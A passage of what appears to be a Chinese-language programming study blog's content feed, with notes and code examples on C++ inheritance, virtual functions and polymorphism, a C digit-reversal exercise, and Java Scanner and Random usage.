name;</span><br><span class="line"><span class="type">int</span> count;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"><span class="built_in">Book</span>()&#123;...&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">get_count</span><span class="params">()</span></span>&#123;<span class="comment">//get_count()const则表示为常成员函数，不能修改类成员变量</span></span><br><span class="line"><span class="keyword">return</span> count;</span><br><span class="line">&#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span>:</span><br><span class="line"><span class="built_in">Book</span>() &#123; ... &#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">set_name</span><span class="params">(<span class="type">const</span> string&amp; name)</span> </span>&#123;</span><br><span class="line"><span class="keyword">this</span>-&gt;set_name = name;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="继承的概念"><a href="#继承的概念" class="headerlink" title="继承的概念"></a>继承的概念</h2><p>同一对象的多重身份<br>· 回顾面向对象思想：首先识别系统中的实体，然后提炼属性&#x2F;行为，然后…<br>· 问题来了：同一个实体可能有多重身份，这些身份之间往往有层次递进关系<br>父类和子类：不同身份之间的层次递进关系</p><h2 id="派生与继承-Inherit"><a href="#派生与继承-Inherit" class="headerlink" title="派生与继承 Inherit"></a>派生与继承 Inherit</h2><p>派生：渐进明细，不断补充<br>继承：获得父类成员（和派生箭头反向）</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> std::cout;</span><br><span class="line"><span class="keyword">using</span> std::endl;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">A</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"><span class="type">int</span> nA;</span><br><span class="line"><span class="built_in">A</span>() &#123;</span><br><span class="line">nA = <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">funcA</span><span class="params">()</span> </span>&#123;</span><br><span class="line">cout &lt;&lt; <span class="string">&quot;funcA\n&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">B</span> :<span class="keyword">public</span> A &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"><span class="type">int</span> nB;</span><br><span class="line"><span class="built_in">B</span>() &#123;</span><br><span class="line">nB = <span class="number">2</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">funcB</span><span class="params">()</span> </span>&#123;</span><br><span class="line">cout &lt;&lt; <span class="string">&quot;funcB\n&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">C</span> :<span class="keyword">public</span> B &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"><span class="type">int</span> nC;</span><br><span class="line"><span class="built_in">C</span>() &#123;</span><br><span class="line">nC = <span class="number">3</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">funcC</span><span class="params">()</span> </span>&#123;</span><br><span class="line">cout &lt;&lt; <span class="string">&quot;funcC\n&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">C c;</span><br><span class="line"></span><br><span class="line">c.<span class="built_in">funcA</span>();</span><br><span class="line">c.<span class="built_in">funcB</span>();</span><br><span class="line">c.<span class="built_in">funcC</span>();</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>public 公有继承、 protected 保护继承、 private 私有继承</p><table><thead><tr><th></th><th>父类的public成员</th><th>父类的protected成员</th><th>父类的private成员</th></tr></thead><tbody><tr><td>public成员</td><td>public</td><td>protected</td><td>不可见</td></tr><tr><td>protected成员</td><td>protected</td><td>protected</td><td>不可见</td></tr><tr><td>private成员</td><td>private</td><td>private</td><td>不可见</td></tr><tr><td>继承方式：决定父类成员在子类中的访问控制属性（不能升级，只能降级）</td><td></td><td></td><td></td></tr><tr><td>· 父类的private成员不会被子类继承</td><td></td><td></td><td></td></tr><tr><td>· 共有继承不改变控制属性，保护继承和私有继承指示父类成员在子类中的相应控制属性</td><td></td><td></td><td></td></tr><tr><td>父子同名并存：</td><td></td><td></td><td></td></tr><tr><td>· 子类中同时有两个n和两个func()</td><td></td><td></td><td></td></tr><tr><td>· 直接使用默认指子类成员</td><td></td><td></td><td></td></tr><tr><td>· 如果需要使用父类的成员，需要使用父类名字空间显式指明</td><td></td><td></td><td></td></tr></tbody></table><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> std::cout;</span><br><span class="line"><span class="keyword">using</span> std::endl;</span><br><span class="line"><span class="keyword">using</span> std::string;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Father</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"><span class="type">int</span> n = <span class="number">1</span>;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">func</span><span class="params">()</span> </span>&#123;</span><br><span class="line">cout &lt;&lt; <span class="string">&quot;This is Father\n&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Son</span> :<span class="keyword">public</span> Father &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"><span class="type">int</span> n = <span class="number">2</span>;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">func</span><span class="params">()</span> </span>&#123;</span><br><span class="line">cout &lt;&lt; <span class="string">&quot;This is Son\n&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">set</span><span class="params">()</span> </span>&#123;</span><br><span class="line">Father::n = <span class="number">-1</span>;</span><br><span class="line">n = <span class="number">-2</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">Son son;</span><br><span class="line"></span><br><span class="line">son.<span class="built_in">func</span>();<span class="comment">//This is Son</span></span><br><span class="line">son.Father::<span class="built_in">func</span>();<span class="comment">//This is Father</span></span><br><span class="line"></span><br><span class="line">son.<span class="built_in">set</span>();</span><br><span class="line">cout &lt;&lt; son.Father::n &lt;&lt; endl;<span class="comment">//-1</span></span><br><span class="line">cout &lt;&lt; son.n &lt;&lt; endl;<span class="comment">//-2</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="虚函数-virtual"><a href="#虚函数-virtual" class="headerlink" title="虚函数 virtual"></a>虚函数 virtual</h2><p>概念：父类的虚数可以在子类中被重写（override），即被重新实现，但参数和返回值必须保持一致！<br>纯虚函数和抽象类<br>· 某些类是抽象的，不是具体的，不可独立存在<br>· 纯虚函数：不现实，仅声明为纯虚函数，留待子类里重写定义<br>· 含有纯虚函数的类叫做抽象类，仅有纯虚函数的类叫接口<br>· 抽象类和接口不可实例化</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> std::cout;</span><br><span class="line"><span class="keyword">using</span> std::endl;</span><br><span class="line"><span class="keyword">using</span> std::string;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Shape</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"><span class="function"><span class="keyword">virtual</span> <span class="type">float</span> <span class="title">getS</span><span class="params">()</span> </span>= <span class="number">0</span>;</span><br><span class="line"><span class="function"><span class="keyword">virtual</span> <span class="type">float</span> <span class="title">getC</span><span class="params">()</span> </span>= <span class="number">0</span>;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Circle</span> :<span class="keyword">public</span> Shape &#123;</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line"><span class="type">float</span> radius;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"><span class="built_in">Circle</span>(<span class="type">float</span> radius) &#123;</span><br><span class="line"><span class="keyword">this</span>-&gt;radius = radius;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">float</span> <span class="title">getS</span><span class="params">()</span> </span>&#123; <span class="keyword">return</span> <span class="number">3.14</span> * radius * radius; &#125;</span><br><span class="line"><span class="function"><span class="type">float</span> <span class="title">getC</span><span class="params">()</span> </span>&#123; <span class="keyword">return</span> <span class="number">2</span> * <span class="number">3.14</span> * radius; &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="comment">//Shape s;</span></span><br><span class="line"><span class="function">Circle <span class="title">c</span><span class="params">(<span class="number">3.5f</span>)</span></span>;</span><br><span class="line">cout &lt;&lt; c.<span class="built_in">getS</span>() &lt;&lt; endl;<span class="comment">//38.465</span></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="多态-Polymorphism"><a href="#多态-Polymorphism" class="headerlink" title="多态 Polymorphism"></a>多态 Polymorphism</h2><p>已多次强调：同一对象可以有多重层级递进身份<br>有这种情况：同一对象在不同的场合中，被外界所关注的是不同的身份</p><h3 id="理解多态"><a href="#理解多态" class="headerlink" title="理解多态"></a>理解多态</h3><p>· 一个对象就是内存中的一个实体，它只属于一个确定的类：最精确的子类<br>· 它可能在不同处被视为不同身份，但它本质行为方式应与外界如何看待它无关！<br>Q：如何保证一个对象执行其最本质的身份的行为？<br>· 利用虚函数重写+指针！！！<br>· 指向子类对象的父类指针！！！</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> std::cout;</span><br><span class="line"><span class="keyword">using</span> std::endl;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Human</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"><span class="function"><span class="keyword">virtual</span> <span class="type">void</span> <span class="title">say</span><span class="params">()</span> </span>&#123;</span><br><span class="line">cout &lt;&lt; <span class="string">&quot;I am human\n&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Student</span> :<span class="keyword">public</span> Human &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"><span class="function"><span class="keyword">virtual</span> <span class="type">void</span> <span class="title">say</span><span class="params">()</span> </span>&#123;</span><br><span class="line">cout &lt;&lt; <span class="string">&quot;I am a student\n&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">CollegeStudent</span> :<span class="keyword">public</span> Student &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">say</span><span class="params">()</span> </span>&#123;</span><br><span class="line">cout &lt;&lt; <span class="string">&quot;I am a college student\n&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">CollegeStudent a;</span><br><span class="line">Human* p1 = (Human*)&amp;a;<span class="comment">//I am a college student</span></span><br><span class="line">Student* p2 = (Student*)&amp;a;<span class="comment">//I am a college student</span></span><br><span class="line">CollegeStudent* p3 = &amp;a;<span class="comment">//I am a college student</span></span><br><span class="line">p1-&gt;<span class="built_in">say</span>();</span><br><span class="line">p2-&gt;<span class="built_in">say</span>();</span><br><span class="line">p3-&gt;<span class="built_in">say</span>();</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="多态的意义"><a href="#多态的意义" class="headerlink" title="多态的意义"></a>多态的意义</h3><p>· 通过“虚函数+指向子类对象的父类指针”，可以把不同的子类统一视为其共同父类<br>· 于是无需针对不同的子类写相同的逻辑，统一视作其共同父类，利用指针操作即可<br>· 本质是虚函数将能做什么和怎么做分离，父类指明要做什么，子类来实现具体做法</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> std::cout;</span><br><span class="line"><span class="keyword">using</span> std::endl;</span><br><span class="line"><span class="keyword">using</span> std::string;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Shape</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"><span class="function"><span class="keyword">virtual</span> <span class="type">float</span> <span class="title">getS</span><span class="params">()</span> </span>= <span class="number">0</span>;</span><br><span class="line"><span class="function"><span class="keyword">virtual</span> <span class="type">float</span> <span class="title">getC</span><span class="params">()</span> </span>= <span class="number">0</span>;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Circle</span> :<span class="keyword">public</span> Shape &#123;</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line"><span class="type">float</span> radius;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"><span class="built_in">Circle</span>(<span class="type">float</span> radius) &#123;</span><br><span class="line"><span class="keyword">this</span>-&gt;radius = radius;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">float</span> <span class="title">getS</span><span class="params">()</span> </span>&#123; <span class="keyword">return</span> <span class="number">3.14</span> * radius * radius; &#125;</span><br><span class="line"><span class="function"><span class="type">float</span> <span class="title">getC</span><span class="params">()</span> </span>&#123; <span class="keyword">return</span> <span class="number">3.14</span> * <span class="number">2</span> * radius; &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Rectangle</span> :<span class="keyword">public</span> Shape &#123;</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line"><span class="type">float</span> a;</span><br><span class="line"><span class="type">float</span> b;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"><span class="built_in">Rectangle</span>(<span class="type">float</span> a,<span class="type">float</span> b)&#123;</span><br><span class="line"><span class="keyword">this</span>-&gt;a = a;</span><br><span class="line"><span class="keyword">this</span>-&gt;b = b;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">float</span> <span class="title">getS</span><span class="params">()</span> </span>&#123; <span class="keyword">return</span> a * b; &#125;</span><br><span class="line"><span class="function"><span class="type">float</span> <span class="title">getC</span><span class="params">()</span> </span>&#123; <span class="keyword">return</span> <span class="number">2</span> * (a + b); &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">displayer</span><span class="params">(Shape* ptr)</span> </span>&#123;</span><br><span class="line"><span class="comment">//此处实现多态</span></span><br><span class="line">cout &lt;&lt; ptr-&gt;<span class="built_in">getS</span>() / ptr-&gt;<span class="built_in">getC</span>() &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="function">Circle <span class="title">c</span><span class="params">(<span class="number">3.5f</span>)</span></span>;</span><br><span class="line"><span class="function">Rectangle <span class="title">r</span><span class="params">(<span class="number">3.f</span>, <span class="number">5.f</span>)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="built_in">displayer</span>(&amp;c);<span class="comment">//1.75</span></span><br><span class="line"><span class="built_in">displayer</span>(&amp;r);<span class="comment">//0.9375</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="静态联编与动态联编"><a href="#静态联编与动态联编" class="headerlink" title="静态联编与动态联编"></a>静态联编与动态联编</h3><p>上述利用虚函数重写+指针实现的多态特指运行时多态，与之相对的是编译时多态<br>· 静态联编&#x3D;编译时多态&#x3D;函数重载&#x3D;overload<br>· 动态联编&#x3D;运行时多态&#x3D;函数重写&#x3D;override<br>联编(bind):确定具体要调用多个同名函数中的哪一个<br>静态联编：在编译时就确定了要调用的是哪个函数（根据多个重载函数的参数列表确定）</p>]]></content>
      
      
      <categories>
          
          <category> C++ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> C++ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>C语言练习题一</title>
      <link href="/2025/11/26/C%E8%AF%AD%E8%A8%80/C%E8%AF%AD%E8%A8%80%E7%BB%83%E4%B9%A0/exe1/"/>
      <url>/2025/11/26/C%E8%AF%AD%E8%A8%80/C%E8%AF%AD%E8%A8%80%E7%BB%83%E4%B9%A0/exe1/</url>
      
        <content type="html"><![CDATA[<h2 id="一、Day-1"><a href="#一、Day-1" class="headerlink" title="一、Day 1"></a>一、Day 1</h2><h3 id="逆序排列问题"><a href="#逆序排列问题" class="headerlink" title="逆序排列问题"></a>逆序排列问题</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line">main()&#123;</span><br><span class="line"><span class="type">int</span> n,b;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;输入一个整数&quot;</span>);</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;n);</span><br><span class="line"><span class="comment">/*int g,s,b,q,w;</span></span><br><span class="line"><span class="comment">g=n%10;</span></span><br><span class="line"><span class="comment">s=(n%100)/10;</span></span><br><span class="line"><span class="comment">b=(n%1000)/100;</span></span><br><span class="line"><span class="comment">q=(n%10000)/1000;</span></span><br><span class="line"><span class="comment">w=n/10000;</span></span><br><span class="line"><span class="comment">printf(&quot;%d%d%d%d%d&quot;,g,s,b,q,w);*/</span></span><br><span class="line"><span class="keyword">while</span>(n!=<span class="number">0</span>)&#123;</span><br><span class="line">b = n % <span class="number">10</span>;</span><br><span class="line">n /= <span class="number">10</span>;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>,b);</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">int b=0;</span></span><br><span class="line"><span class="comment">b=b*10+a%10;</span></span><br><span class="line"><span class="comment">printf(&quot;%d&quot;,b);</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="自然数之和"><a href="#自然数之和" class="headerlink" title="自然数之和"></a>自然数之和</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure><h3 id="逆序排列问题-1"><a href="#逆序排列问题-1" class="headerlink" title="逆序排列问题"></a>逆序排列问题</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure><h3 id="逆序排列问题-2"><a href="#逆序排列问题-2" class="headerlink" title="逆序排列问题"></a>逆序排列问题</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure><h3 id="逆序排列问题-3"><a href="#逆序排列问题-3" class="headerlink" title="逆序排列问题"></a>逆序排列问题</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> C语言 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> C语言 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>语句</title>
      <link href="/2025/11/25/Java/learningg/%E6%A8%A1%E5%9D%974/"/>
      <url>/2025/11/25/Java/learningg/%E6%A8%A1%E5%9D%974/</url>
      
        <content type="html"><![CDATA[<h2 id="一、键盘录入-Scanner"><a href="#一、键盘录入-Scanner" class="headerlink" title="一、键盘录入 Scanner"></a>一、键盘录入 Scanner</h2><p>1.概述：Java定义好的一个类<br>2.位置：java.util<br>3.使用：<br>a.导包：通过导包找到要使用的类    -&gt;  导包位置：类上<br>import java.util.Scanner  -&gt;导入的是哪个包下的哪个类<br>c.调用方法，实现键盘录入<br>变量名.nextInt()   输入整数int型<br>变量名.next()     输入字符串    String型</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.pan.helloworld;</span><br><span class="line"><span class="keyword">import</span> java.util.Scanner;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Scanner111</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;请输入整数：&quot;</span>);</span><br><span class="line">        Scanner sc=<span class="keyword">new</span> <span class="title class_">Scanner</span>(System.in);</span><br><span class="line">        <span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> sc.nextInt();</span><br><span class="line">        System.out.println(i);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>4.next()和nextLine()区别：<br>变量名.next():录入字符串（遇到空格和回车就结束录入了）<br>变量名.nextLine()：录入字符串（遇到回车就就结束录入，空格不管）<br>!!!录入的数据类型要和要求的一致</p><h2 id="Random随机数"><a href="#Random随机数" class="headerlink" title="Random随机数"></a>Random随机数</h2><p>1.概述：Java定义好的一个类<br>2.作用：可在指定范围内随机一个整数<br>3.位置：java.util<br>4.使用：<br>a.导包：import  java.util.Random<br>b.创建对象：<br>Random  变量名 &#x3D; new Random()<br>c.调用方法，生成随机数：<br>变量名.nextInt()  ———-在Int的取值范围内随机一个整数</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.pan.helloworld;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.Random;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">b_random</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        Random rd=<span class="keyword">new</span> <span class="title class_">Random</span>();</span><br><span class="line">        <span class="type">int</span> i=rd.nextInt();</span><br><span class="line">        System.out.println(i);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在指定范围内随机一个数：<br>nextInt(int bound)   -&gt;  在0 - (bound-1)<br><em><strong>前闭后开</strong></em><br>a.nextInt(10) -&gt; 在0-9随机<br>b.在1-10之前随机生成一个数：nextInt（10）+1  -&gt;   (0-9)+1   -&gt;  1-10</p><h2 id="switch（选择语句）分支语句-循环语句"><a href="#switch（选择语句）分支语句-循环语句" class="headerlink" title="switch（选择语句）分支语句 循环语句"></a>switch（选择语句）分支语句 循环语句</h2>]]></content>
      
      
      <categories>
          
          <category> Java </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>运算符</title>
